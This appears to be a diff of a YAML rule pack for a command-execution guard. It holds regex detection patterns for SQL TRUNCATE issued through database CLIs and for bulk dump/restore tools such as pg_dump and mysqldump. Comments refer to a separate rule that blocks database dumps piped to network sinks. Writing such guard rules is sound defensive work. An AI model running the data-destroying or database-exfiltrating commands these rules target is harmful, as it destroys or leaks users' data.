+          #                         # The negative guard hands CASCADE (FK closure) and RESTART
+          #                         # IDENTITY (which rewrites every owned sequence) to the
+          #                         # block rule / out of this one, so this id only ever claims
+          #                         # "one table's rows". An unqualified TRUNCATE therefore does
+          #                         # not appear among the BLOCK rules at all.
+          #
+          pattern: "(?:(?:-[ce]\\s+['\\\"]?|--(?:command|execute)(?:=|\\s+)['\\\"]?)(?<![\\w-])truncate\\b|-[ce]\\s+['\\\"][^'\\\"]*;\\s*(?<![\\w-])truncate\\b|-[ce]\\s+['\\\"][^'\\\"]*['\\\"][^'\\\"]*['\\\"][^'\"]*(?<![\\w-])truncate\\b|(?<![\\w-])(?:sqlite3|sqlplus)\\b(?:(?!truncate\\b).)*(?<![\\w-])['\\\"][^'\"]*(?<![\\w-])truncate\\b)(?![\\s\\S]*\\b(?:cascade|restart)\\b)"
   - id: "pack-db-dump-restore"
-    description: "Bulk database dump/restore tooling (namespace wrap, command still runs)"
+    description: "Bulk database dump/restore tooling (gray: namespace wrap, command still runs)"
     priority: 650
     action: sandbox
     block_message: "Auto-sandboxed by the optional 'db' rule pack: bulk dump/restore tooling reads or rewrites a whole database."
     match:
       type: pattern
-      # pg_dump / pg_dumpall / pg_restore / mysqldump / mysqlimport. The
-      # namespace wrap does NOT restrict network or database access — it
-      # contains the filesystem view; the command still runs.
-      # Shape rule, so a capability probe (`pg_dump --version`) is wrapped
-      # too — exactly what the builtin auto-sandbox tier does for `make
-      # --version`. The command still runs and prints its version.
+      #                 # pg_dump / pg_dumpall / pg_restore / mysqldump / mysqlimport. The
+      #                 # namespace wrap does NOT restrict network or database access — it
+      #                 # contains the filesystem view; the command still runs. Shape rule,
+      #                 # so a capability probe (`pg_dump --version`) is wrapped too —
+      #                 # exactly what the builtin auto-sandbox tier does for
+      #                 # `make --version`. A dump piped to a NETWORK sink is claimed
+      #                 # earlier by pack-db-dump-exfil (950, block) — one vector, one
+      #                 # verdict.
+      #
       pattern: "(?<![\\w-])(?:pg_dump|pg_dumpall|pg_restore|mysqldump|mysqlimport)\\b"
